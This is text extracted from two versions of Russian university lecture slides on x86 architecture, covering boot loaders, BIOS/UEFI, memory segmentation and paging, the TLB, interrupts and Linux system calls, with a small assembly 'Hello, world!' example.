• Прерывания и системные вызовы
                                                  14
                       © 2024 МГУ/ВМК/СП




Режимы работы x86-64




                              15
                                                                      © 2024 МГУ/ВМК/СП




                           Загрузчик

• Загрузка компьютера – последовательность (цепочка)
  выполнения все более сложных загрузчиков
• Загрузчик – системная программа, цель которой
  обеспечить запуск операционной системы
• Решаемая задача – начальная конфигурация аппаратуры,
  возможность программно взаимодействовать с ней.

                              Размещение в           Проверка
        Конфигурирование
                            памяти следующего      целостности и
           аппаратуры
                                загрузчика      передача управления



            Типовые действия на очередном этапе загрузки


                                                                             16
                                                                                               © 2024 МГУ/ВМК/СП




                                    Схема загрузки IA-32

     •    Проверка целостности аппаратуры: короткие замыкания и обрывы
     •    При включении питания выполнение команд начинается с адреса 0xFFFFFFF0
           –   Содержимое ROM отображается на адреса памяти
           –   ROM содержит загрузчик (в x86 традиционно называемый BIOS) – набор
               микропрограмм, предоставленных производителем аппаратуры.
     •    Упрощенная последовательность действий BIOS
           –   Копирование кода из ROM в RAM
           –   Самопроверка кода, проверка целостности, в случае доверенной загрузки – проверка
               ЭЦП кода
           –   Начальная конфигурация аппаратуры
           –   Размещение в оперативной памяти ACPI таблиц (описание имеющийся аппаратуры)
           –   Последовательно пытаемся копировать MBR (master boot record, сектор №0, 512 байт)
               каждого загрузочного устройства в память по адресу 0x7c00
                 • Если сектор скопировать удалось, BIOS передает управление на адрес 0x7c00
     •    MBR-загрузчик копирует в память загрузчик операционной системы и
          передает ему управление
     •    Загрузчик операционной системы копирует в память ядро операционной
          системы и передает ему управление


                                                                                                      17
https://wiki.osdev.org/System_Initialization_(x86)
                                           © 2024 МГУ/ВМК/СП




                 Реальный режим / 8086
 Прог. 1   Прог. 2      Прог. 3    …

• В каждый момент времени
  работает только одна программа
   – Эта программа управляет всеми
     ресурсами (ЦПУ, память, ввод/вывод)
• Машинное слово 16 разрядов,
  адрес памяти 20 разрядов
   – Сегментные регистры – 16 разрядов
   – Исполнительный адрес =
      (сег_рег) << 4 + смещение
• Доступна вся адресуемая память
• Периферийные устройства
  управляются через порты
  ввода/вывода                                    18
   – Команды in и out
                                                                      © 2024 МГУ/ВМК/СП




                                          BIOS  UEFI

    • UEFI – (Unified) Extensible Firmware
      Interface
    • Традиционный BIOS работал в реальном
      режиме. Функции BIOS не могут быть
      использованы, после перехода в
      защищенный режим
    • UEFI – стандарт интерфейса встроенного
      ПО, которым может воспользоваться ОС
          – Модульная структура, компоненты можно
            добавлять или удалять
    • Стандартизированные абстракции для
      работы с периферийными устройствами и
      шинами
    • Спецификация состояния аппаратуры
      перед загрузкой ОС

Дополнительный материал:
Доверенная загрузка GNU-Linux в режиме UEFI Secure Boot в 2021 году
(Николай Костригин, OSSDEVCONF-2021)                                         20
                                                          © 2024 МГУ/ВМК/СП




                       Стандарт ACPI

• ACPI – Advanced Configuration and Power Interface
• Проблема: управление энергопотреблением
  периферийных устройств и набора микросхем
   – ОС должна содержать драйвер для каждой модели материнской
     платы
• Решение: организовать драйвер в виде двух раздельных
  компонент: описания аппаратуры и интерпретатора этого
  описания
• BIOS размещает в оперативной памяти две группы ACPI
  таблиц
   – Перечисление имеющейся в компьютере аппаратуры и некоторых
     ее свойств
   – Набор микропрограмм, описывающих работу с устройствами
      • Архитектурно независимый язык AML
• В состав ОС входит интерпретатор языка AML
                                                                 21
                                   © 2024 МГУ/ВМК/СП



      ACPI: упрощенная схема
взаимодействия BIOS, ОС и аппаратуры




                                          22
                                                                                     © 2024 МГУ/ВМК/СП



        Многозадачная работа компьютера:
            требования к аппаратуре
1.   Привилегированный режим
     – Разделение машинных команд на две категории: пользовательские и
       привилегированные
2.   Механизм защиты памяти
     – Изоляция кода/данных различных программ
       (и операционной системы) друг от друга
3.   Таймер
     – Принудительное вытеснение работающей программы с процессора
     – Многозадачность: невытесняющая и вытесняющая
         • Non-preemptive multitasking – невытесняющая многозадачность – выполняющаяся
           программа сама отдает управление операционной системы для того, чтобы та передала
           управление другой программе
         • Preemptive multitasking – вытесняющая многозадачность – решение о переключении
           процессора с выполнения одной программы на выполнение другой принимает
           операционная система (планировщик), а не сама выполняющаяся программа.
4.   Механизм прерываний
     – Возможность процессора отреагировать на возникновение некоторого
       события – передать управление на определенный код и изменить состояние
       регистров и памяти
         • (не)штатный ход выполнения очередной команды
         • сигналы от других устройств, в том числе – от таймера                            23
                                                                   © 2024 МГУ/ВМК/СП




                Модели памяти в IA-32
                                Исполнительный адрес ≡ Линейный адрес
• Реальный режим
   – Модель памяти с реальной адресацией
     линейный адрес = сегментный регистр << 4 + смещение
     Адрес физической памяти = линейный адрес
• Режимы защищенной памяти: сегменты + страницы
   – Дополнительный уровень косвенности
      • Описания сегментов размещаются в памяти: таблица сегментных
        дескрипторов
      • Сегментный регистр ссылается на сегментный дескриптор
      • Начальный (базовый) адрес сегмента определяется по содержимому
        описателя сегмента
   – Базовая плоская модель
      • Защищенная плоская модель
   – Мультисегментная модель
   – Независимо от используемой модели памяти может быть
     включена страничная трансляция адресов

                                                                          24
                              © 2024 МГУ/ВМК/СП




(Защищенная) плоская модель




                                     25
                          © 2024 МГУ/ВМК/СП




Мультисегментная модель




                                 26
                          © 2024 МГУ/ВМК/СП




А что в реальной жизни?




                                 27
                                                              © 2024 МГУ/ВМК/СП




           Защищенный режим / 80386

• Машинное слово и адрес 32 бита
• Два дополнительных сегментных регистра gs и fs
• Регистры управления CRn
   – CR3 используется для управления доступом к памяти
• Аппаратная защита памяти
   – Базы таблиц дескрипторов GDTR, LDTR, IDTR
   – Мультисегментная модель памяти
      • Фактически не используется
   – Многоуровневая трансляция адреса памяти
      • Сегменты и страницы, функционируют независимо друг от друга
• Аппаратное переключение задач
   – фактически не используется

                                                                      28
                                                   © 2024 МГУ/ВМК/СП



        Сегментные селектор и дескриптор




• G – гранулярность длины сегмента
   – 0 – длина в байтах, 1 – длина в блоках 4КБ
• Длина сегмента варьируется от 1 байта до 4 ГБ,          29
  начиная с 1 МБ – с шагом в 4КБ
                                                 © 2024 МГУ/ВМК/СП




          Адресация в защищенном режиме

CS, DS, SS, ES, GS, FS   mov edx, dword [ds:eax
                                        [eax + 4+*4ecx]
                                                    * ecx]




                                                        30
                                                                                           © 2024 МГУ/ВМК/СП




              Страничная организация памяти

•   Виртуальные адреса отображаются на физические постранично, т.е. блоками
    фиксированного размера
•   Какие задачи решаются?
     –   Нехватка физической памяти
          • Используется только требуемая физическая память
          • Содержимое страниц можно временно сбрасывать на жесткий диск в файл подкачки, а при
            необходимости – загружать обратно в физическую память
          • Разрозненные блоки физической памяти можно сделать непрерывным адресным
            пространством виртуальной памяти
     –   Изоляция одновременно работающих программ
•   Линейные адреса автоматически преобразуются в физические адреса.
     –   Память разделена на фрагменты-страницы одинакового размера, например, 4096 байт
     –   Старшие биты адреса меняются на биты, взятые из соответствующей записи таблицы
         страниц
•   Отображение адресов и проверку прав доступа выполняет блок управления
    памятью (MMU)
     –   Отображение задет таблица страниц, которая сама хранится в физической памяти
•   Операционная система при запуске программы формирует адресное
    пространство процесса (запущенной программы), определяя трансляцию
    адресов только для необходимых диапазонов – размещение секций, стека, …
                                                                                                  31
                                                   © 2024 МГУ/ВМК/СП




                 Страничная организация памяти




                                                          32
Пример заимствован https://wiki.osdev.org/Paging
                                                 © 2024 МГУ/ВМК/СП

            Запись в таблице страниц
           (на примере 4 КБ страниц)




• P – присутствие страницы (1 – страница доступна)
• R/W – разрешение записи
• U/S – разрешение доступа к странице
  пользовательскому коду
• PWT – страница со сквозной записью
• PCD – отключение кэширования
• A – признак того, что к странице обращались
• D – признак того, что в страницу записывали данные
                                                        33
© 2024 МГУ/ВМК/СП




       34
                                                                    © 2024 МГУ/ВМК/СП




    TLB – буфер ассоциативной трансляции

• TLB – translation look-aside buffer
• TLB кэширует записи таблицы страниц, т.е. является служебным
  (специализированным) кэшем
   – В отличие от кэша данных хранятся не блоки, а номера страниц
• Каждая запись в TLB содержит
   – Поле tag, сформированное из фрагмента номера страницы
     виртуальной памяти
   – Данные – запись таблицы страниц, в том числе номер страницы
     физической памяти
• TLB значительно меньше по размеру кэшей данных
   – Организация: от прямого отображения до полностью ассоциативного
   – Разделение на TLB инструкций и TLB данных, раздельные таблицы
     для пользовательский программ и операционной системы
   – Несколько уровней (размер/скорость)


                                                                           35
                                                  © 2024 МГУ/ВМК/СП



     Упрощенная схема извлечения данных из
             виртуальной памяти
  Логический адрес
• Вычисляем смещение / адресный
  код в машинной команде
• Вычисляем линейный адрес /
  сегменты
  Линейный адрес
• Пересчитываем линейный адрес
  в физический
   – Если есть запись в TLB берем
     готовый адрес
   – Если в TLB ничего нет, вычисляем
     физический адрес, проходя по
     таблицам трансляции и
     запоминаем его в TLB
  Физический адрес
• Обращаемся в память за
  данными                               Процент промахов
   – Берем из кэша, если данные в нем    в TLB: 0.1 – 1.0%
     присутствуют
                                                         36
                                                                                  © 2024 МГУ/ВМК/СП




          Задача: память модельного компьютера

   • 256 адресуемых ячеек размером 1 байт
   • Размер страницы – 16 байт
          – p – бит, показывающий наличие страницы
   • TLB – 2-канальный множественно-ассоциативный кэш
          – v – бит, показывающий актуальность записи
   • Кэш данных
          – Кэш прямого отображения, 4 байта в строке, 8 наборов
                                                                         Кэш данных
   • Считываем ячейку памяти по виртуальному
     линейному адресу 0xcd                                             Набор tag v
                                                                        0         7     1
Первые четыре записи                                                    1         7     0
  в таблице страниц                                                     2         1     0
     VPN PPN p                        Состояние TLB                     3         0     1
      0      -    0                                                     4         2     1
                       Набор    tag   v PPN p tag       v PPN p
      1      f    1                                                     5         3     1
                          0     2     1   -   0   6     1   0      1
      2      2    1                                                     6         0     0
                          1     0     1   f   1   3     1   -      0
      3      -    0                                                     7         0     0
                                                                                         37
VPN – Номер страницы виртуальной памяти, PPN – Номер страницы физической памяти
                                                  © 2024 МГУ/ВМК/СП




              Уровни (кольца) защиты

• Каждый уровень привилегий обладает своим контекстом:
  состоянием системных регистров и регистров общего
  назначения, стеком вызовов функций, …
   – Сменили уровень
     защиты – изменился ESP
• Уровни защиты
  1 и 2, как правило,
  не используются
• Смена уровня привилегий –
  затратное по времени действие
• Переход между уровнями
  контролируется полями PL в дескрипторах сегментов
• Возможность выполнения привилегированных команд
  определяется текущим уровнем привилегий                38
                                                                                © 2024 МГУ/ВМК/СП




                      Типы и классы прерываний

    • Два типа прерываний – один механизм обработки
       – Асинхронные прерывания – события, происходящие в периферийных
         устройствах (Ввод/Вывод).
       – Синхронные прерывания (исключения) – возникновение определенных
         ситуаций при выполнении команд процессором

         Класс                   Причина               Синх./      Возврат управления
                                                       Асинх.
     Прерывания        Сигнал от периферийного        Асинх.     Всегда возвращаемся на
И
                       устройства (ввод/вывод)                   следующую команду
с
к    Ловушки           Преднамеренный выброс          Синхр.     Всегда возвращаемся на
л
     (Trap)            исключения                                следующую команду
ю    Сбои              Потенциально                   Синхр.     Возможно возвращаемся
ч    (Fault)           восстанавливаемая ошибка                  на текущую команду
е    АвОст             Неустранимая ошибка            Синхр.     Никогда не возвращаем
н    (Abort)                                                     управление
и              В других процессорных архитектурах терминология                         39
я              может незначительной отличаться
                                                                      © 2024 МГУ/ВМК/СП




         Примеры некоторых прерываний

Вектор (№)    Мнемоника    Описание              Источник
0             #DE          Ошибка при делении    Команды DIV и IDIV
3             #BP          Точка останова        Команда INT 3
13            #GP          Сбой защиты           Любые ситуации,
                                                 связанные с нарушением
                                                 защиты памяти
14            #PF          Отсутствие страницы   Обращение к
                                                 отсутствующей странице
16            #MF          Сбой в x87 FPU        Команды x87
18            #MC          Непоправимый сбой в   Механизм самопроверки
                           работе аппаратуры     аппаратуры
32-255        ‒            Определяется          Внешние прерывания или
                           пользователем         команда INT n

             Какие классы у перечисленных прерываний?                        40
                                                            © 2024 МГУ/ВМК/СП




               Реакция на прерывание

• При возникновении прерывания управление передается
  обработчику, на заданный адрес. После обработки
  управление может быть возвращено в прерванную
  программу.
   – В этот момент можно повысить уровень привилегий!
   – Для определения адреса обработчика используется номер
     прерывания (вектор) и таблица описателей прерываний (IDT)
   – Будет возвращено управление или нет – зависит от события,
     приведшего к возникновению прерывания
• Некоторые прерывания можно маскировать
• «Доставку» прерываний в процессор выполняет
  программируемый контроллер прерываний (PIC)
   – Local APIC, I/O APIC
   – Контроллер прерываний содержит таймер:
     через заданное пользователем число тактов будет выбрасываться
     прерывание от таймера
                                                                   41
                                                                             © 2024 МГУ/ВМК/СП



       Local APIC и I/O APIC в многоядерном
                     компьютере
     Процессор         Процессор             Процессор           Процессор
         ЦПУ                   ЦПУ                  ЦПУ                ЦПУ



Прерывания        Прерывания           Прерывания         Прерывания

                 Прерывания          Системная (локальная) шина процессора
                                                     IPI (inter-processor interrupt) –
                                                     межпроцессорные прерывания,
                          Мост
                                                     используемые для
                                                     синхронизации работы ядер.
                                                     В основном используются для
                                                     управления кэшем.
                                                    Внешние
                                                    прерывания

                         Набор микросхем
                                                                                    42
                                                  © 2024 МГУ/ВМК/СП



Передача управления в обработчик
прерывания в защищенном режиме

      IDT




                                 • Каждое кольцо защиты
                                   обладает своим стеком
                                 • Возврат из обработчика
                                   прерывания – отдельное
                                   семейство команд iret
                 В некоторых случаях (например, #PF)
                 на стек дополнительно помещается        43
                 код ошибки
                                                     © 2024 МГУ/ВМК/СП




                  Системные вызовы

• Аппаратура, память операционной системы и других
  программ не доступны
   – Привилегированные команды
   – Страничная трансляция адресов
• Системный вызов – основной способ «обратиться» к
  операционной системе
   – syscall/sysret
   – sysenter/sysexit
   – int/iret
• В ОС Linux системный вызов реализован как прерывание
   – int 0x80
   – Передача параметров – через регистры:
     номер функции – eax
     параметры – ebx, ecx, edx, esi, edi
                                                            44
                                                                                © 2024 МГУ/ВМК/СП



                         Примеры некоторых
                     системных вызовов ОС Linux
    EAX      Название       EBX                    ECX                 EDX
    1        sys_exit       int                             ‒                 ‒
    3        sys_read       unsigned int           char *              size_t
    4        sys_write      unsigned int           const char *        size_t
    5        sys_open       const char *           int                 int
    6        sys_close      unsigned int                    ‒                 ‒
    116      sys_sysinfo struct sysinfo *                   ‒                 ‒

    Источник: http://docs.cs.up.ac.za/programming/asm/derick_tut/syscalls.html (Eng)


Что дальше
•       Коллекция статей об устройстве ОС (для тех, кому интересно)
        http://wiki.osdev.org/Expanded_Main_Page (Eng)
•       Курс «Операционные системы»
                                                                                       45
•       Последний в этом курсе пример «Hello, world!»
                                                                    © 2024 МГУ/ВМК/СП


snoop@earth:~/samples$ nasm -f elf32 -o syscall.o syscall.asm
snoop@earth:~/samples$ nm syscall.o
  «Hello, world!» без привлечения языка Си
00000000 T _start
00000000 d msg
0000000e a msg_len
snoop@earth:~/samples$ ld -o syscall syscall.o
snoop@earth:~/samples$ nm syscall
080490b2 A __bss_start                       section .data
080490b2 A _edata                              msg db `Hello, world!\n`
080490b4 A _end                                msg_len equ $-msg
08048080 T _start
080490a4 d msg                               section .text
0000000e a msg_len                           global _start
snoop@earth:~/samples$ ./syscall             _start:
Hello, world!                                   mov eax, 4
snoop@earth:~/samples$                          mov ebx, 1
                                                mov ecx, msg
 #include <unistd.h>                            mov edx, msg_len
 #include <stdlib.h>                            int 80h

void main() {                                   mov eax, 1
   write(1, "Hello, world!\n", 14);             mov ebx, 0
   exit(0);                                     int 80h
}
                                                                           46
              © 2021 МГУ/ВМК/СП




Лекция 0x18


   1 мая
                                                               © 2021 МГУ/ВМК/СП




Начальная загрузка компьютера – последовательность (цепочка)
выполнения все более сложных загрузчиков.                              2
Конечная цель – загрузка операционной системы
                                                                              © 2021 МГУ/ВМК/СП




                       Схема загрузки IA-32

• При включении питания выполнение команд начинается с
  адреса 0xFFFFFFF0
   – Содержимое ROM отображается на адреса памяти
   – ROM содержит BIOS – набор микропрограмм, предоставленных
     производителем аппаратуры. Их цель – дать возможность провести
     конфигурацию аппаратуры и программно взаимодействовать с ней.
• BIOS
   – Копирование кода из ROM в RAM
   – Самопроверка кода
   – Начальная конфигурация аппаратуры
   – Размещение в оперативной памяти ACPI таблиц
   – Последовательно пытаемся копировать MBR (сектор №0, 512 байт)
     каждого загрузочного устройства в память по адресу 0x7c00
         • Если сектор скопировать удалось, BIOS передает управление на адрес 0x7c00
• MBR-загрузчик копирует в память загрузчик операционной
  системы и передает ему управление
• Загрузчик операционной системы копирует в память ядро                                3
  операционной системы и передает ему управление
                                           © 2021 МГУ/ВМК/СП




                 Реальный режим / 8086
 Прог. 1   Прог. 2      Прог. 3    …

• В каждый момент времени
  работает только одна программа
   – Эта программа управляет всеми
     ресурсами (ЦПУ, память, ввод/вывод)
• Машинное слово 16 разрядов,
  адрес памяти 20 разрядов
   – Сегментные регистры
   – Исполнительный адрес =
      (сег_рег) << 4 + смещение
• Доступна вся адресуемая память
• Периферийные устройства
  управляются через порты
  ввода/вывода                                     4
   – Команды in и out
                                         © 2021 МГУ/ВМК/СП




                         BIOS  UEFI

• UEFI – (Unified) Extensible Firmware
  Interface
• Функции BIOS не могут быть
  использованы, после перехода в
  защищенный режим
• UEFI – стандарт интерфейса
  встроенного ПО, которым может
  воспользоваться ОС
   – Модульная структура, компоненты
     можно добавлять или удалять
• Стандартизированные абстракции для
  работы с периферийными
  устройствами и шинами
• Спецификация состояния аппаратуры
  перед загрузкой ОС

                                                 6
                                                          © 2021 МГУ/ВМК/СП




                       Стандарт ACPI

• ACPI – Advanced Configuration and Power Interface
• Проблема: управление энергопотреблением
  периферийных устройств и набора микросхем
   – ОС должна содержать драйвер для каждой модели материнской
     платы
• Решение: организовать драйвер в виде двух раздельных
  компонент: описания аппаратуры и интерпретатора этого
  описания
• BIOS размещает в оперативной памяти две группы ACPI
  таблиц
   – Перечисление имеющейся в компьютере аппаратуры и некоторых
     ее свойств
   – Набор микропрограмм, описывающих работу с устройствами
      • Архитектурно независимый язык AML
• В состав ОС входит интерпретатор языка AML
                                                                  7
                                   © 2021 МГУ/ВМК/СП



      ACPI: упрощенная схема
взаимодействия BIOS, ОС и аппаратуры




                                           8
                                                               © 2021 МГУ/ВМК/СП



     Многозадачная работа компьютера:
         требования к аппаратуре
1. Привилегированный режим
  – Разделение машинных команд на две категории:
    пользовательские и привилегированные
2. Механизм защиты памяти
  – Изоляция кода/данных различных программ
    (и операционной системы) друг от друга
3. Таймер
  – Принудительное вытеснение программы с процессора
  – Многозадачность: невытесняющая и вытесняющая
4. Механизм прерываний
  – Возможность процессора отреагировать на возникновение
    некоторого события – передать управление на определенный код
    и изменить состояние регистров и памяти
     • (не)штатный ход выполнения очередной команды
     • сигналы от других устройств, в том числе – от таймера

                                                                       9
                                                        © 2021 МГУ/ВМК/СП




              Модели памяти в IA-32
                           Исполнительный адрес ≡ Линейный адрес
• Реальный режим
  – Модель памяти с реальной адресацией
    линейный адрес = сегментный регистр << 4 + смещение
    Адрес физической памяти = линейный адрес
• Режимы защищенной памяти
  Дополнительный уровень косвенности: начальный
  (базовый) адрес сегмента определяется по таблице
  описателей сегментов, размещенной в памяти
  – Базовая плоская модель
     • Защищенная плоская модель
  – Мультисегментная модель
• Независимо от используемой модели памяти может
  быть включена страничная трансляция адресов

                                                               10
                 © 2021 МГУ/ВМК/СП




Плоская модель




                        11
                          © 2021 МГУ/ВМК/СП




Мультисегментная модель




                                 12
                          © 2021 МГУ/ВМК/СП




А что в реальной жизни?




                                 13
                                                         © 2021 МГУ/ВМК/СП




           Защищенный режим / 80386

• Машинное слово и адрес 32 бита
• Два дополнительных сегментных регистра gs и fs
• Регистры управления CRn
   – CR3 используется для управления доступом к памяти
• Аппаратная защита памяти
   – Базы таблиц дескрипторов GDTR, LDTR, IDTR
   – Мультисегментная модель памяти
      • Фактически не используется
   – Многоуровневая трансляция адреса памяти
• Аппаратное переключение задач
   – фактически не используется

                                                                14
                                   © 2021 МГУ/ВМК/СП



Сегментные селектор и дескриптор




                                          15
                                                 © 2021 МГУ/ВМК/СП




          Адресация в защищенном режиме

CS, DS, SS, ES, GS, FS   mov edx, dword [ds:eax
                                        [eax + 4+*4ecx]
                                                    * ecx]




                                                        16
                                                  © 2021 МГУ/ВМК/СП




       Страничная организация памяти

• Нехватка физической памяти
• Изоляция одновременно работающих программ
• Линейные адреса автоматически преобразуются в
  физические адреса.
  – Память разделена на фрагменты-страницы
    одинакового размера.
  – Старшие биты адреса меняются на биты, взятые из
    соответствующей записи таблицы страниц
• Отображение адресов выполняет блок
  управления памятью (MMU)
                                                         17
                                                   © 2021 МГУ/ВМК/СП




                 Страничная организация памяти




                                                          18
Пример заимствован https://wiki.osdev.org/Paging
                                                 © 2021 МГУ/ВМК/СП

            Запись в таблице страниц
           (на примере 4 КБ страниц)




• P – присутствие страницы (1 – страница доступна)
• R/W – разрешение записи
• U/S – разрешение доступа к странице
  пользовательскому коду
• PCD – отключение кэширования
• A – признак того, что к странице обращались
• D – признак того, что в страницу записывали данные
                                                        19
© 2021 МГУ/ВМК/СП




       20
                                                                    © 2021 МГУ/ВМК/СП




    TLB – буфер ассоциативной трансляции

• TLB – translation look-aside buffer
• TLB кэширует записи таблицы страниц, т.е. является служебным
  (специализированным) кэшем
   – В отличие от кэша данных хранятся не блоки, а номера страниц
• Каждая запись в TLB содержит
   – Поле tag, сформированное из фрагмента номера страницы
     виртуальной памяти
   – Данные – запись таблицы страниц, в том числе номер страницы
     физической памяти
• TLB значительно меньше по размеру кэшей данных
   – Организация: от прямого отображения до полностью ассоциативного
   – Разделение на TLB инструкций и TLB данных, раздельные таблицы
     для пользовательский программ и операционной системы
   – Несколько уровней (размер/скорость)


                                                                           21
                                                  © 2021 МГУ/ВМК/СП



     Упрощенная схема извлечения данных из
             виртуальной памяти
  Логический адрес
• Вычисляем смещение / адресный
  код в машинной команде
• Вычисляем линейный адрес /
  сегменты
  Линейный адрес
• Пересчитываем линейный адрес
  в физический
   – Если есть запись в TLB берем
     готовый адрес
   – Если в TLB ничего нет, вычисляем
     физический адрес, проходя по
     таблицам трансляции и
     запоминаем его в TLB
  Физический адрес
• Обращаемся в память за
  данными                               Процент промахов
   – Берем из кэша, если данные в нем    в TLB: 0.1 – 1.0%
     присутствуют
                                                         22
                                                                                  © 2021 МГУ/ВМК/СП




          Задача: память модельного компьютера

   • 256 адресуемых ячеек размером 1 байт
   • Размер страницы – 16 байт
          – p – бит, показывающий наличие страницы
   • TLB – 2-канальный множественно-ассоциативный кэш
          – v – бит, показывающий актуальность записи
   • Кэш данных
          – Кэш прямого отображения, 4 байта в строке, 8 наборов
                                                                         Кэш данных
   • Считываем ячейку памяти по виртуальному
     линейному адресу 0xcd                                             Набор tag v
                                                                        0         7     1
Первые четыре записи                                                    1         7     0
  в таблице страниц                                                     2         1     0
     VPN PPN p                        Состояние TLB                     3         0     1
      0      -    0                                                     4         2     1
                       Набор    tag   v PPN p tag       v PPN p
      1      f    1                                                     5         3     1
                          0     2     1   -   0   6     1   0      1
      2      2    1                                                     6         0     0
                          1     0     1   f   1   3     1   -      0
      3      -    0                                                     7         0     0
                                                                                         23
VPN – Номер страницы виртуальной памяти, PPN – Номер страницы физической памяти
                                                  © 2021 МГУ/ВМК/СП




              Уровни (кольца) защиты

• Каждый уровень привилегий обладает своим контекстом:
  состоянием системных регистров и регистров общего
  назначения, стеком вызовов функций, …
   – Сменили уровень
     защиты – изменился ESP
• Уровни защиты
  1 и 2, как правило,
  не используются
• Смена уровня привилегий –
  затратное по времени действие
• Переход между уровнями
  контролируется полями PL в дескрипторах сегментов
• Возможность выполнения привилегированных команд
  определяется текущим уровнем привилегий                24
                                                                                © 2021 МГУ/ВМК/СП




                      Типы и классы прерываний

    • Два типа прерываний – один механизм обработки
       – Асинхронные прерывания – события, происходящие в периферийных
         устройствах (Ввод/Вывод).
       – Синхронные прерывания (исключения) – возникновение определенных
         ситуаций при выполнении команд процессором

         Класс                   Причина               Синх./      Возврат управления
                                                       Асинх.
     Прерывания        Сигнал от периферийного        Асинх.     Всегда возвращаемся на
И
                       устройства (ввод/вывод)                   следующую команду
с
к    Ловушки           Преднамеренный выброс          Синхр.     Всегда возвращаемся на
л
     (Trap)            исключения                                следующую команду
ю    Сбои              Потенциально                   Синхр.     Возможно возвращаемся
ч    (Fault)           восстанавливаемая ошибка                  на текущую команду
е    АвОст             Неустранимая ошибка            Синхр.     Никогда не возвращаем
н    (Abort)                                                     управление
и              В других процессорных архитектурах терминология                         25
я              может незначительной отличаться
                                                                      © 2021 МГУ/ВМК/СП




         Примеры некоторых прерываний

Вектор (№)    Мнемоника    Описание              Источник
0             #DE          Ошибка при делении    Команды DIV и IDIV
3             #BP          Точка останова        Команда INT 3
13            #GP          Сбой защиты           Любые ситуации,
                                                 связанные с нарушением
                                                 защиты памяти
14            #PF          Отсутствие страницы   Обращение к
                                                 отсутствующей странице
16            #MF          Сбой в x87 FPU        Команды x87
18            #MC          Непоправимый сбой в   Механизм самопроверки
                           работе аппаратуры     аппаратуры
32-255        ‒            Определяется          Внешние прерывания или
                           пользователем         команда INT n

             Какие классы у перечисленных прерываний?                        26
                                                            © 2021 МГУ/ВМК/СП




               Реакция на прерывание

• При возникновении прерывания управление передается
  обработчику, на заданный адрес. После обработки
  управление может быть возвращено в прерванную
  программу.
   – В этот момент можно повысить уровень привилегий!
   – Для определения адреса обработчика используется номер
     прерывания (вектор) и таблица описателей прерываний (IDT)
   – Будет возвращено управление или нет – зависит от события,
     приведшего к возникновению прерывания
• Некоторые прерывания можно маскировать
• «Доставку» прерываний в процессор выполняет
  программируемый контроллер прерываний (PIC)
   – Local APIC, I/O APIC
   – Контроллер прерываний содержит таймер:
     через заданное пользователем число тактов будет выбрасываться
     прерывание от таймера
                                                                   27
                                                                             © 2021 МГУ/ВМК/СП



       Local APIC и I/O APIC в многоядерном
                     компьютере
     Процессор         Процессор             Процессор           Процессор
         ЦПУ                   ЦПУ                  ЦПУ                ЦПУ



Прерывания        Прерывания           Прерывания         Прерывания

                 Прерывания          Системная (локальная) шина процессора
                                                     IPI (inter-processor interrupt) –
                                                     межпроцессорные прерывания,
                          Мост
                                                     используемые для
                                                     синхронизации работы ядер.
                                                     В основном используются для
                                                     управления кэшем.
                                                    Внешние
                                                    прерывания

                         Набор микросхем
                                                                                    28
                                                  © 2021 МГУ/ВМК/СП



Передача управления в обработчик
прерывания в защищенном режиме

      IDT




                                 • Каждое кольцо защиты
                                   обладает своим стеком
                                 • Возврат из обработчика
                                   прерывания – отдельное
                                   семейство команд iret
                 В некоторых случаях (например, #PF)
                 на стек дополнительно помещается        29
                 код ошибки
                                                     © 2021 МГУ/ВМК/СП




                  Системные вызовы

• Аппаратура, память операционной системы и других
  программ не доступны
   – Привилегированные команды
   – Страничная трансляция адресов
• Системный вызов – основной способ «обратиться» к
  операционной системе
   – syscall/sysret
   – sysenter/sysexit
   – int/iret
• В ОС Linux системный вызов реализован как прерывание
   – int 0x80
   – Передача параметров – через регистры:
     номер функции – eax
     параметры – ebx, ecx, edx, esi, edi
                                                            30
                                                                                © 2021 МГУ/ВМК/СП



                       Примеры некоторых
                   системных вызовов ОС Linux
    EAX     Название       EBX                     ECX                 EDX
    1       sys_exit       int                              ‒                 ‒
    3       sys_read       unsigned int            char *              size_t
    4       sys_write      unsigned int            const char *        size_t
    5       sys_open       const char *            int                 int
    6       sys_close      unsigned int                     ‒                 ‒
    116     sys_sysinfo struct sysinfo *                    ‒                 ‒

    Источник: http://docs.cs.up.ac.za/programming/asm/derick_tut/syscalls.html (Eng)


Дальнейшие и дополнительные материалы
•       Основной курс 3 семестра «Операционные системы»
•       Коллекция статей об устройстве ОС
        http://wiki.osdev.org/Expanded_Main_Page (Eng)                                 31
                                                             © 2021 МГУ/ВМК/СП

snoop@earth:~/samples$ nasm -f elf32 -o syscall.o syscall.asm
snoop@earth:~/samples$ nm syscall.o
  «Hello, world!» без привлечения языка Си
00000000 T _start
00000000 d msg
0000000e a msg_len
snoop@earth:~/samples$ ld -o syscall syscall.o
snoop@earth:~/samples$ nm syscall
080490b2 A __bss_start
                                        section .data
080490b2 A _edata
                                          msg db `Hello, world!\n`
080490b4 A _end
                                          msg_len equ $-msg
08048080 T _start
080490a4 d msg
                                        section .text
0000000e a msg_len
                                        global _start
snoop@earth:~/samples$ ./syscall
                                        _start:
Hello, world!
                                           mov eax, 4
snoop@earth:~/samples$
                                           mov ebx, 1
 #include <unistd.h>                       mov ecx, msg
 #include <stdlib.h>                       mov edx, msg_len
                                           int 80h
void main() {
   write(1, "Hello, world!\n", 14);        mov eax, 1
   exit(0);                                mov ebx, 0               32
}                                          int 80h
                                         КОНСПЕКТ ПОДГОТОВЛЕН СТУДЕНТАМИ, НЕ ПРОХОДИЛ
                                         ПРОФ. РЕДАКТУРУ И МОЖЕТ СОДЕРЖАТЬ ОШИБКИ.
 МЕХАНИКА • СЛЕПКОВ АЛЕКСАНДР ИВАНОВИЧ   СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ НА VK.COM/TEACHINMSU.


                 ФАКУЛЬТЕТ
                 ВЫЧИСЛИТЕЛЬНОЙ
                 МАТЕМАТИКИ И
                 КИБЕРНЕТИКИ
                 МГУ ИМЕНИ
                 М.В. ЛОМОНОСОВА




АРХИТЕКТУРА ЭВМ И
ЯЗЫК АССЕМБЛЕРА
            ПАДАРЯН
      ВАРТАН АНДРОНИКОВИЧ

                                   ВМК МГУ




         КОНСПЕКТ ПОДГОТОВЛЕН
       СТУДЕНТАМИ, НЕ ПРОХОДИЛ
        ПРОФ. РЕДАКТУРУ И МОЖЕТ
          СОДЕРЖАТЬ ОШИБКИ.
       СЛЕДИТЕ ЗА ОБНОВЛЕНИЯМИ
         НА VK.COM/TEACHINMSU.

          ЕСЛИ ВЫ ОБНАРУЖИЛИ
         ОШИБКИ ИЛИ ОПЕЧАТКИ,
         ТО СООБЩИТЕ ОБ ЭТОМ,
